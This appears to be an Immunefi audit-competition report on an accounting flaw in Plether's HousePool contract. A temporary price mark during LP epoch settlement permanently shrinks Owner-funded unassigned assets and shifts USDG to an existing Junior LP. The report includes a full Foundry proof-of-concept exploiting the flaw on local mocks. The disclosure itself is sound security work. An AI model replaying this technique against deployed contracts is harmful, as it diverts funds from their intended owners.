# \#99456 [SC-Medium] Transient marked NAV permanently reduces Owner-funded unassigned assets and diverts USDG to an existing Junior LP

**Submitted on Nov 13th 2026 at 18:29:30 UTC by @Pig46940 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99456
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

An LP epoch settled while a trader has a temporary marked profit permanently lowers `HousePool.unassignedAssets`, even though the Pool has not transferred or lost the Owner-funded USDG represented by that bucket. When the price returns and the trader closes at the original price, the bucket is not restored. A pre-existing Junior LP can redeem more of the same Pool cash; a later, legitimate Owner assignment mints fewer shares for the Owner's chosen beneficiary, who then receives less actual USDG. The attached one-test PoC reproduces both transfers under the release six-feed basket configuration.

## Vulnerability Details

`CfdEngine.recapitalizePool()` pulls real USDG from the authorized Owner directly into `HousePool` and records the inflow without minting LP shares. After claimant restoration, surplus is kept in `unassignedAssets`. The pinned architecture calls this recognized Pool value with no LP claimant path and says it must be explicitly assigned rather than silently becoming an LP windfall. The only assignment method, `HousePool.assignUnassignedAssets()`, is Owner-restricted and mints matching tranche shares to the Owner's selected receiver.

The first incorrect committed write is caused by the interaction of marked terminal NAV and the unassigned-asset cap. `HousePoolAccountingLib.buildReconcileSnapshot()` subtracts an open trader's marked terminal profit from `snapshot.distributable`. A fresh interim price therefore changes that value even though no USDG has left the Pool:

```solidity
// HousePoolAccountingLib.sol, buildReconcileSnapshot()
uint256 terminalAssets = engineSnapshot.physicalAssets;
uint256 terminalLiabilities = engineSnapshot.traderClaimBalanceAssets;
int256 terminalDelta = engineSnapshot.terminalLpPriceDeltaAssets;
if (terminalDelta >= 0) {
    terminalAssets += uint256(terminalDelta);
} else {
    terminalLiabilities += uint256(-(terminalDelta + 1)) + 1;
}
if (terminalAssets >= terminalLiabilities) {
    snapshot.distributable = terminalAssets - terminalLiabilities;
} else {
    snapshot.deficit = terminalLiabilities - terminalAssets;
}
```

`HousePoolReconcilePlanLib.planReconcile()` then overwrites the stored unassigned amount with the smaller marked value. `HousePool._reconcile()` persists that value during a real LP epoch settlement:

```solidity
// HousePoolReconcilePlanLib.sol, planReconcile()
plan.state.unassignedAssets =
    state.unassignedAssets > snapshot.distributable
        ? snapshot.distributable
        : state.unassignedAssets;

// HousePool.sol, _reconcile()
_setWaterfallState(plan.state.waterfall);
unassignedAssets = plan.state.unassignedAssets;
```

There is no symmetric restoration of the same ownership bucket when the mark returns. The recovered value instead enters the tranche waterfall. The Owner's subsequent assignment reads the already reduced balance, calculates shares from it, and mints those shares to the designated receiver:

```solidity
// HousePool.sol, assignUnassignedAssets()
_reconcile(ctx.accountingSnapshot);
uint256 amount = unassignedAssets;
uint256 shares = ITrancheVaultBootstrap(targetVault).quoteBootstrapDeposit(amount);
// The PoC selects the Junior branch of this function.
juniorPrincipal += amount;
unassignedAssets = 0;
ITrancheVaultBootstrap(targetVault).bootstrapMint(shares, receiver);
```

The issue is the permanent change in *who may claim the recovered cash*. It does not depend on claiming that an Ownerless bucket can never absorb market risk. The disputed transition is writing a temporary mark-based reduction into its lasting ownership allocation and later allowing existing LP shares to receive that recovered value without the required Owner assignment.

This first cause differs from the published Cecuro MED-12 same-batch recapitalization/revenue-continuation error, MED-26 initial trading activation with unresolved unassigned assets, and LOW-65 Owner-controlled seed assignment. It also differs from the Senior high-water-mark scaling issue MED-11. SC Audit Studio's broad HousePool redesign recommendation does not describe this temporary-mark cap and subsequent share-ownership transfer. 

## Impact Details

The Owner legitimately supplies **2,990,000.000000 USDG**. In both histories the Owner later calls the same `assignUnassignedAssets(false, beneficiary)` entrypoint at the restored mark, and the beneficiary redeems the resulting Junior shares. The only difference between histories is the interim mark supplied for one actual LP epoch: neutral `1.000` in the control, `0.985` in the adverse history. After the trader closes at the neutral mark, Pool physical cash and trader settlement balance are identical.

| Committed measurement | Neutral interim mark | Lower interim mark | Difference |
| --- | ---: | ---: | ---: |
| Pool ERC-20 cash before assignment | 3,000,445.186476 USDG | 3,000,445.186476 USDG | 0 |
| Trader Clearinghouse balance after close | 199,114.613524 USDG | 199,114.613524 USDG | 0 |
| Stored `unassignedAssets` before assignment | 2,990,000.000000 USDG | 2,985,516.644666 USDG | −4,483.355334 USDG |
| Senior high-water mark after divergent epoch | 1,001.579966 USDG | 1,001.579966 USDG | 0 |
| Senior principal after Owner assignment | 1,001.579971 USDG | 1,001.579966 USDG | −0.000005 USDG |
| Junior principal after Owner assignment | 2,999,443.606505 USDG | 2,999,443.606510 USDG | +0.000005 USDG |
| Existing Junior LP: actual funded USDG received | 8,395.756626 USDG | 12,381.644885 USDG | **+3,985.888259 USDG** |
| Owner-designated beneficiary: actual funded USDG received | 2,989,999.981745 USDG | 2,985,516.626426 USDG | **−4,483.355319 USDG** |

The beneficiary's redemption request in each history funds and pays actual ERC-20 USDG; this is not a preview or an event-only claim. The unassigned-bucket difference and beneficiary payout difference differ by only **15 USDG atoms**. After assignment, the combined Senior and Junior principal equals the same physical Pool cash in both histories; the material difference is share ownership, not aggregate Pool solvency. The Senior high-water mark differs by only five atoms after assignment, so the 4,483.355319 USDG recipient loss is not a Senior recovery-target deletion.

If the existing Junior LP also controls the trader, the two accounts together end the adverse history with **3,496.258409 USDG more than their 208,000.000000 USDG deposited principal**, before gas and oracle-service costs. The trader's round-trip settlement loss is 885.386476 USDG in both histories. The Junior LP's *incremental* payout caused by the interim mark is 3,985.888259 USDG. The remainder of the diverted value benefits other already outstanding shares and rounding; this report does not attribute all 4,483.355334 USDG to the attacker wallet.

The proposed "Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield" impact concerns the Owner-funded recovery USDG and the Owner's exclusive documented power to assign its unclaimed surplus to a beneficiary. The PoC does **not** assume that the beneficiary had an LP redemption claim before the Owner's assignment. It proves that a normal Owner assignment after the attack creates fewer beneficiary shares and produces a smaller actual payment, while the pre-existing Junior LP receives more. 

## References

- [Pinned architecture: unassigned assets require explicit assignment](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/INTERNAL_ARCHITECTURE_MAP.md#L75)
- [Pinned accounting specification: claimant paths and Owner recapitalization](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L627-L652)
- [Marked terminal distributable](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolAccountingLib.sol#L60-L78)
- [Unassigned cap](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol#L68-L95)
- [Committed state writer](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1555-L1585)
- [Owner-only assignment and share minting](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L660-L703)
- [Vault bootstrap share quote and mint](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1392-L1398)


## Proof of Concept

## Proof of Concept

The complete Solidity test is included below. Run it against the frozen competition repository at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`.

1. From the repository root, verify the commit and create the test directory:

   ```bash
   git rev-parse HEAD
   mkdir -p packages/perps/test/perps/spec/lp
   cd packages/perps
   ```

   `git rev-parse HEAD` must print `a82d4fefb02768e5b3bddcc97dee371eee24fea8`.

2. Start creating the test file:

   ```bash
   cat > test/perps/spec/lp/R14OwnerFundedAssetsSixFeedPoC.t.sol <<'SOLIDITY'
   ```

   Paste **all** of the Solidity code in the code block below, beginning with `// SPDX-License-Identifier: AGPL-3.0` and ending with the contract’s final `}`. Do not paste the Markdown lines containing ` ```solidity ` or ` ``` `. After the final `}`, type `SOLIDITY` alone on a new line and press Enter to save the file.

3. Run the single PoC test from `packages/perps`:

   ```bash
   forge test --offline -j 1 \
     --match-path test/perps/spec/lp/R14OwnerFundedAssetsSixFeedPoC.t.sol \
     --match-test test_TemporaryMarkReducesOwnerSelectedBeneficiaryPayout \
     -vv
   ```

The expected test summary is `1 passed; 0 failed`. The test compares two histories that differ only in the intermediate basket mark. Its assertions check actual USDG paid to the Junior LP and the Owner-selected beneficiary, alongside Pool cash, trader balance, and unassigned-asset accounting.

The test uses the six release basket components and permitted local MockPyth data. It does not modify any in-scope production contract or assert that the synthetic feed sequence occurred on a public chain.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {console2} from "forge-std/console2.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

/// @notice Matched EVM histories: only the intermediate live mark differs.
/// Uses public V3 Router orders, real Owner recap, LP queues, and ERC20 claims.
contract R14OwnerFundedAssetsSixFeedPoC is BasePerpTest {
    address internal constant JUNIOR_LP = address(0xA11CE);
    address internal constant OWNER_SELECTED_BENEFICIARY = address(0x0BEEF);
    address internal constant DUST_SHARE_HOLDER = address(0xD057);
    address internal constant TRADER_ACCOUNT = address(0x7ADE);
    address internal constant PERMISSIONLESS_KEEPER = address(0xBEEF);
    uint256 internal constant NEUTRAL_BASKET_PRICE = 100_000_000;
    uint256 internal constant LOWER_BASKET_PRICE = 98_500_000;
    uint256 internal constant POSITION_SIZE = 1_100_000e18;
    uint256 internal constant OWNER_FUNDED_ASSETS = 2_990_000e6;

    struct HistoryOutcome {
        uint256 unassignedAssetsAfterInterimEpoch;
        uint256 seniorHighWaterMarkAfterInterimEpoch;
        uint256 unassignedAssetsBeforeAssignment;
        uint256 poolCashBeforeAssignment;
        uint256 seniorPrincipalBeforeAssignment;
        uint256 traderClearinghouseBalance;
        uint256 attackerJuniorPayout;
        uint256 beneficiarySharesMinted;
        uint256 beneficiaryPayout;
        uint256 seniorPrincipalAfterAssignment;
        uint256 seniorHighWaterAfterAssignment;
        uint256 juniorPrincipalAfterAssignment;
        uint256 poolCashAfterAssignment;
    }

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8_000);

        bytes32[] memory feedIds = _releaseFeedIds();
        uint256[] memory weights = _releaseWeights();
        uint256[] memory basePrices = _releaseBasePrices();
        bool[] memory inverted = _releaseInversions();
        for (uint256 index; index < feedIds.length; ++index) {
            uint256 rawPrice = _rawFeedPrice(NEUTRAL_BASKET_PRICE, basePrices[index], inverted[index]);
            baseMockPyth.setPrice(feedIds[index], int64(uint64(rawPrice)), 0, -8, block.timestamp);
        }
        PletherOracle sixFeedOracle = new PletherOracle(
            address(engine), address(pool), address(baseMockPyth), feedIds, weights, basePrices, inverted
        );
        IOrderRouterAdminHost.RouterConfig memory releaseRouterConfig = _routerConfig();
        releaseRouterConfig.minOpenNotionalAssets = 1_000e6;
        routerAdmin.proposeRouterConfig(releaseRouterConfig);
        routerAdmin.proposeOracleConfig(IOrderRouterAdminHost.OracleConfig(address(sixFeedOracle)));
        vm.warp(routerAdmin.oracleConfigActivationTime());
        routerAdmin.finalizeOracleConfig();
        routerAdmin.finalizeRouterConfig();
        pletherOracle = sixFeedOracle;
        baseMockPyth.setSynchronizeLegacyUniquePrices(false);

        // Configuration activates during the FX weekend; advance to the next live session.
        vm.warp(block.timestamp + 1 days);
        assertFalse(engine.isOracleFrozen(), "release basket must be live");
        _mark(NEUTRAL_BASKET_PRICE);
    }

    function _releaseFeedIds() private pure returns (bytes32[] memory feedIds) {
        feedIds = new bytes32[](6);
        feedIds[0] = 0xa995d00bb36a63cef7fd2c287dc105fc8f3d93779f062f09551b0af3e81ec30b;
        feedIds[1] = 0xef2c98c804ba503c6a707e38be4dfbb16683775f195b091252bf24693042fd52;
        feedIds[2] = 0x84c2dde9633d93d1bcad84e7dc41c9d56578b7ec52fabedc1f335d673df0a7c1;
        feedIds[3] = 0x3112b03a41c910ed446852aacf67118cb1bec67b2cd0b9a214c58cc0eaa2ecca;
        feedIds[4] = 0x8ccb376aa871517e807358d4e3cf0bc7fe4950474dbe6c9ffc21ef64e43fc676;
        feedIds[5] = 0x0b1e3297e69f162877b577b0d6a47a0d63b2392bc8499e6540da4187a63e28f8;
    }

    function _releaseWeights() private pure returns (uint256[] memory weights) {
        weights = new uint256[](6);
        weights[0] = 576e15;
        weights[1] = 136e15;
        weights[2] = 119e15;
        weights[3] = 91e15;
        weights[4] = 42e15;
        weights[5] = 36e15;
    }

    function _releaseBasePrices() private pure returns (uint256[] memory basePrices) {
        basePrices = new uint256[](6);
        basePrices[0] = 117_500_000;
        basePrices[1] = 638_000;
        basePrices[2] = 134_480_000;
        basePrices[3] = 72_880_000;
        basePrices[4] = 10_860_000;
        basePrices[5] = 126_100_000;
    }

    function _releaseInversions() private pure returns (bool[] memory inverted) {
        inverted = new bool[](6);
        inverted[1] = true;
        inverted[3] = true;
        inverted[4] = true;
        inverted[5] = true;
    }

    function _rawFeedPrice(uint256 basketPrice, uint256 basePrice, bool inverted)
        private pure returns (uint256)
    {
        uint256 normalizedComponent = basePrice * basketPrice / NEUTRAL_BASKET_PRICE;
        return inverted ? (10_000_000_000_000_000 + normalizedComponent / 2) / normalizedComponent
            : normalizedComponent;
    }

    function _sixFeedUpdateData(uint256 basketPrice, bool historicalOrderPrice)
        private returns (bytes[] memory updateData)
    {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint256 publishTime = historicalOrderPrice ? _mockHistoricalPublishTime() : vm.getBlockTimestamp();
        bytes32[] memory feedIds = _releaseFeedIds();
        uint256[] memory basePrices = _releaseBasePrices();
        bool[] memory inverted = _releaseInversions();
        MockPyth.FeedUpdate[] memory feedUpdates = new MockPyth.FeedUpdate[](feedIds.length);
        for (uint256 index; index < feedIds.length; ++index) {
            uint256 rawPrice = _rawFeedPrice(basketPrice, basePrices[index], inverted[index]);
            feedUpdates[index] = MockPyth.FeedUpdate({
                id: feedIds[index],
                price: MockPyth.MockPrice({
                    price: int64(uint64(rawPrice)),
                    conf: 0,
                    expo: -8,
                    publishTime: publishTime,
                    prevPublishTime: publishTime == 0 ? 0 : publishTime - 1
                })
            });
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(feedUpdates);
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) { return 0; }
    function _initialSeniorDeposit() internal pure override returns (uint256) { return 0; }
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory riskParameters) {
        riskParameters = super._riskParams();
        riskParameters.vpiFactor = 0.01e18;
        riskParameters.maintMarginBps = 10;
        riskParameters.initMarginBps = 20;
    }

    function test_TemporaryMarkReducesOwnerSelectedBeneficiaryPayout() public {
        _depositJuniorForAttacker();
        _prepareDustShareHolder();
        _provideOwnerRecoveryAssets();
        _reconcileOwnerRecoveryAssets();
        assertEq(pool.unassignedAssets(), OWNER_FUNDED_ASSETS, "Owner recap should be quarantined");
        assertGt(pool.juniorPrincipal(), 8_990e6, "Junior ownership before trade");
        assertGt(pool.seniorPrincipal(), 1_000e6, "Senior ownership before trade");

        _fundTrader(TRADER_ACCOUNT, 200_000e6);
        _mark(NEUTRAL_BASKET_PRICE);
        _order(false);
        uint256 split = vm.snapshotState();
        HistoryOutcome memory control = _executeHistory(NEUTRAL_BASKET_PRICE);
        assertTrue(vm.revertToState(split));
        HistoryOutcome memory adverse = _executeHistory(LOWER_BASKET_PRICE);

        console2.log("control unassigned assets after interim epoch", control.unassignedAssetsAfterInterimEpoch);
        console2.log("adverse unassigned assets after interim epoch", adverse.unassignedAssetsAfterInterimEpoch);
        console2.log("control Senior high-water mark after interim epoch", control.seniorHighWaterMarkAfterInterimEpoch);
        console2.log("adverse Senior high-water mark after interim epoch", adverse.seniorHighWaterMarkAfterInterimEpoch);
        console2.log("control unassigned assets before Owner assignment", control.unassignedAssetsBeforeAssignment);
        console2.log("adverse unassigned assets before Owner assignment", adverse.unassignedAssetsBeforeAssignment);
        console2.log("control attacker Junior USDG paid", control.attackerJuniorPayout);
        console2.log("adverse attacker Junior USDG paid", adverse.attackerJuniorPayout);
        console2.log("control designated-beneficiary Junior shares", control.beneficiarySharesMinted);
        console2.log("adverse designated-beneficiary Junior shares", adverse.beneficiarySharesMinted);
        console2.log("control designated-beneficiary USDG paid", control.beneficiaryPayout);
        console2.log("adverse designated-beneficiary USDG paid", adverse.beneficiaryPayout);
        console2.log("control Senior principal after assignment", control.seniorPrincipalAfterAssignment);
        console2.log("adverse Senior principal after assignment", adverse.seniorPrincipalAfterAssignment);
        console2.log("control Senior high-water after assignment", control.seniorHighWaterAfterAssignment);
        console2.log("adverse Senior high-water after assignment", adverse.seniorHighWaterAfterAssignment);
        console2.log("control Junior principal after assignment", control.juniorPrincipalAfterAssignment);
        console2.log("adverse Junior principal after assignment", adverse.juniorPrincipalAfterAssignment);
        console2.log("control Pool cash before redeem", control.poolCashBeforeAssignment);
        console2.log("control Senior principal before Owner assignment", control.seniorPrincipalBeforeAssignment);
        console2.log("adverse Senior principal before Owner assignment", adverse.seniorPrincipalBeforeAssignment);
        console2.log("control Trader balance", control.traderClearinghouseBalance);
        console2.log("adverse Trader balance", adverse.traderClearinghouseBalance);
        console2.log("adverse Pool cash before redeem", adverse.poolCashBeforeAssignment);

        assertEq(control.unassignedAssetsAfterInterimEpoch, OWNER_FUNDED_ASSETS, "neutral mark preserves U");
        assertLt(adverse.unassignedAssetsAfterInterimEpoch, control.unassignedAssetsAfterInterimEpoch, "low mark erodes U");
        assertEq(adverse.seniorHighWaterMarkAfterInterimEpoch, control.seniorHighWaterMarkAfterInterimEpoch, "same Senior HWM after interim settlement");
        assertEq(adverse.unassignedAssetsBeforeAssignment, adverse.unassignedAssetsAfterInterimEpoch, "U is not restored");
        assertEq(control.poolCashBeforeAssignment, adverse.poolCashBeforeAssignment, "matched physical Pool cash");
        assertEq(control.poolCashAfterAssignment, adverse.poolCashAfterAssignment, "assignment transfers no Pool USDG");
        assertEq(control.traderClearinghouseBalance, adverse.traderClearinghouseBalance, "matched Trader balance");
        assertGt(adverse.attackerJuniorPayout, control.attackerJuniorPayout + 880e6, "Junior LP gain exceeds round-trip execution fees");
        assertLt(adverse.beneficiaryPayout, control.beneficiaryPayout, "Owner-selected beneficiary receives less USDG");
        assertGt(control.beneficiaryPayout - adverse.beneficiaryPayout, 4_000e6, "beneficiary loss is material");
        assertLt(adverse.beneficiarySharesMinted, control.beneficiarySharesMinted, "adverse branch mints fewer shares");
    }

    function _depositJuniorForAttacker() internal {
        settlementToken.mint(JUNIOR_LP, 8_000e6);
        vm.startPrank(JUNIOR_LP);
        settlementToken.approve(address(juniorVault), 8_000e6);
        uint256 id = juniorVault.requestDeposit(8_000e6, JUNIOR_LP, JUNIOR_LP);
        vm.stopPrank();
        _mature(id);
        pool.settleLpEpoch(0, 0);
        uint256 assets = juniorVault.claimableDepositRequest(id, JUNIOR_LP);
        assertEq(assets, 8_000e6);
        vm.prank(JUNIOR_LP);
        uint256 shares = juniorVault.claimDeposit(id, assets, JUNIOR_LP, JUNIOR_LP);
        assertGt(shares, 1);
    }

    function _prepareDustShareHolder() internal {
        _waitCooldown();
        vm.prank(JUNIOR_LP);
        juniorVault.transfer(DUST_SHARE_HOLDER, 1);
        assertEq(juniorVault.balanceOf(DUST_SHARE_HOLDER), 1);
    }

    function _provideOwnerRecoveryAssets() internal {
        settlementToken.mint(address(this), OWNER_FUNDED_ASSETS);
        settlementToken.approve(address(engine), OWNER_FUNDED_ASSETS);
        engine.recapitalizePool(OWNER_FUNDED_ASSETS);
    }

    function _reconcileOwnerRecoveryAssets() internal {
        vm.prank(DUST_SHARE_HOLDER);
        uint256 id = juniorVault.requestRedeem(1, DUST_SHARE_HOLDER, DUST_SHARE_HOLDER);
        _mature(id);
        pool.settleLpEpoch(0, 0);
        assertEq(pool.pendingRecapitalizationAssets(), 0);
        assertEq(juniorVault.refundableRedeemRequest(id, DUST_SHARE_HOLDER), 1, "dust should refund");
        vm.prank(DUST_SHARE_HOLDER);
        juniorVault.claimRedeemRefund(id, DUST_SHARE_HOLDER, DUST_SHARE_HOLDER);
    }

    function _executeHistory(uint256 intermediatePrice) internal returns (HistoryOutcome memory outcome) {
        uint256 dustReady = juniorVault.lastDepositTime(DUST_SHARE_HOLDER) + juniorVault.DEPOSIT_COOLDOWN() + 1;
        if (vm.getBlockTimestamp() < dustReady) vm.warp(dustReady);
        vm.prank(DUST_SHARE_HOLDER);
        uint256 dustId = juniorVault.requestRedeem(1, DUST_SHARE_HOLDER, DUST_SHARE_HOLDER);
        _mature(dustId);
        _settleAt(intermediatePrice);
        outcome.unassignedAssetsAfterInterimEpoch = pool.unassignedAssets();
        outcome.seniorHighWaterMarkAfterInterimEpoch = pool.seniorHighWaterMark();
        assertEq(pool.pendingRecapitalizationAssets(), 0, "R14 has no residual recap");
        assertEq(juniorVault.refundableRedeemRequest(dustId, DUST_SHARE_HOLDER), 1, "dust queue work");
        vm.prank(DUST_SHARE_HOLDER);
        juniorVault.claimRedeemRefund(dustId, DUST_SHARE_HOLDER, DUST_SHARE_HOLDER);

        _mark(NEUTRAL_BASKET_PRICE);
        _order(true);
        assertEq(engine.totalTraderClaimBalanceAssets(), 0, "no deferred trader claim");
        outcome.poolCashBeforeAssignment = settlementToken.balanceOf(address(pool));
        outcome.seniorPrincipalBeforeAssignment = pool.seniorPrincipal();
        outcome.traderClearinghouseBalance = clearinghouse.balanceAssets(TRADER_ACCOUNT);
        outcome.unassignedAssetsBeforeAssignment = pool.unassignedAssets();
        pool.assignUnassignedAssets(false, OWNER_SELECTED_BENEFICIARY);
        outcome.beneficiarySharesMinted = juniorVault.balanceOf(OWNER_SELECTED_BENEFICIARY);
        assertGt(outcome.beneficiarySharesMinted, 0, "Owner explicitly assigns Junior shares");
        outcome.seniorPrincipalAfterAssignment = pool.seniorPrincipal();
        outcome.seniorHighWaterAfterAssignment = pool.seniorHighWaterMark();
        outcome.juniorPrincipalAfterAssignment = pool.juniorPrincipal();
        outcome.poolCashAfterAssignment = settlementToken.balanceOf(address(pool));
        assertEq(pool.unassignedAssets(), 0, "Owner assignment consumes quarantined balance");

        _waitCooldown();
        uint256 shares = juniorVault.maxRequestRedeem(JUNIOR_LP);
        assertGt(shares, 0, "Junior LP has redeemable shares");
        vm.prank(JUNIOR_LP);
        uint256 id = juniorVault.requestRedeem(shares, JUNIOR_LP, JUNIOR_LP);
        _mature(id);
        _settleAt(NEUTRAL_BASKET_PRICE);
        uint256 funded = juniorVault.claimableRedeemRequest(id, JUNIOR_LP);
        assertGt(funded, 0, "Junior LP redemption must fund");
        uint256 beforeWallet = settlementToken.balanceOf(JUNIOR_LP);
        vm.prank(JUNIOR_LP);
        outcome.attackerJuniorPayout = juniorVault.claimRedeem(id, funded, JUNIOR_LP, JUNIOR_LP);
        assertEq(settlementToken.balanceOf(JUNIOR_LP) - beforeWallet, outcome.attackerJuniorPayout, "real USDG transfer");
        outcome.beneficiaryPayout = _redeemOwnerSelectedBeneficiary();
    }

    function _redeemOwnerSelectedBeneficiary() internal returns (uint256 paid) {
        uint256 ready = juniorVault.lastDepositTime(OWNER_SELECTED_BENEFICIARY) + juniorVault.DEPOSIT_COOLDOWN() + 1;
        if (vm.getBlockTimestamp() < ready) vm.warp(ready);
        uint256 shares = juniorVault.maxRequestRedeem(OWNER_SELECTED_BENEFICIARY);
        assertGt(shares, 0, "Owner-selected beneficiary has redeemable shares");
        vm.prank(OWNER_SELECTED_BENEFICIARY);
        uint256 requestId = juniorVault.requestRedeem(shares, OWNER_SELECTED_BENEFICIARY, OWNER_SELECTED_BENEFICIARY);
        _mature(requestId);
        _settleAt(NEUTRAL_BASKET_PRICE);
        uint256 funded = juniorVault.claimableRedeemRequest(requestId, OWNER_SELECTED_BENEFICIARY);
        assertEq(funded, shares, "Owner-selected beneficiary shares fully funded");
        uint256 beforeWallet = settlementToken.balanceOf(OWNER_SELECTED_BENEFICIARY);
        vm.prank(OWNER_SELECTED_BENEFICIARY);
        paid = juniorVault.claimRedeem(requestId, funded, OWNER_SELECTED_BENEFICIARY, OWNER_SELECTED_BENEFICIARY);
        assertEq(settlementToken.balanceOf(OWNER_SELECTED_BENEFICIARY) - beforeWallet, paid, "real Owner-selected beneficiary USDG transfer");
    }

    function _settleAt(uint256 price) internal {
        bytes[] memory payload = _sixFeedUpdateData(price, false);
        uint256 feeWei = pletherOracle.getUpdateFee(payload);
        vm.deal(PERMISSIONLESS_KEEPER, 10 ether);
        vm.prank(PERMISSIONLESS_KEEPER);
        router.settleLpEpoch{value: feeWei}(payload);
        assertApproxEqAbs(engine.lastMarkPrice(), price, 50, "six-feed settlement mark");
    }

    function _mark(uint256 price) internal {
        bytes[] memory payload = _sixFeedUpdateData(price, false);
        uint256 feeWei = pletherOracle.getUpdateFee(payload);
        vm.deal(PERMISSIONLESS_KEEPER, 10 ether);
        vm.prank(PERMISSIONLESS_KEEPER);
        router.updateMarkPrice{value: feeWei}(payload);
        assertApproxEqAbs(engine.lastMarkPrice(), price, 50, "six-feed refreshed mark");
    }

    function _order(bool isCloseOrder) internal {
        OrderV3Types.OrderRequest memory request;
        request.clientOrderId = bytes32(uint256(router.nextCommitId()));
        request.side = CfdTypes.Side.LONG;
        request.sizeDelta = POSITION_SIZE;
        request.marginDelta = isCloseOrder ? 0 : 100_000e6;
        request.targetPrice = isCloseOrder ? type(uint256).max : 1;
        request.isClose = isCloseOrder;
        request.bounds.submitBy = uint64(vm.getBlockTimestamp() + 120);
        request.bounds.executionWindowSeconds = 60;
        request.bounds.allowedExecutionModes = 7;
        request.bounds.expectedConfigHash = router.lifecycleBook().currentExecutionConfigHash();
        request.bounds.maxExecutionBountyAssets = type(uint256).max;
        request.bounds.maxExecutionNotionalAssets = type(uint256).max;
        request.bounds.maxGrossAccountDebitAssets = type(uint256).max;
        request.bounds.maxActionChargeAssets = type(uint256).max;
        request.bounds.maxExplicitFeesAssets = type(uint256).max;
        request.bounds.maxPostPositionSize = type(uint256).max;
        request.bounds.maxPostLeverageBps = type(uint32).max;

        vm.prank(TRADER_ACCOUNT);
        uint64 id = router.commitOrder(request);
        bytes[] memory payload = _sixFeedUpdateData(NEUTRAL_BASKET_PRICE, true);
        uint256 feeWei = pletherOracle.getOrderExecutionFee(payload);
        vm.deal(PERMISSIONLESS_KEEPER, 10 ether);
        vm.prank(PERMISSIONLESS_KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder{value: feeWei}(id, payload);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "public order failed");
        (uint256 positionSizeAfterExecution,,,,,,) = engine.positions(TRADER_ACCOUNT);
        assertEq(positionSizeAfterExecution, isCloseOrder ? 0 : POSITION_SIZE, "Engine position mismatch");
    }

    function _waitCooldown() internal {
        uint256 ready = juniorVault.lastDepositTime(JUNIOR_LP) + juniorVault.DEPOSIT_COOLDOWN() + 1;
        if (vm.getBlockTimestamp() < ready) vm.warp(ready);
    }

    function _mature(uint256 id) internal {
        uint256 ready = pool.lpEpochStart(id);
        if (vm.getBlockTimestamp() < ready) vm.warp(ready);
    }
}
```
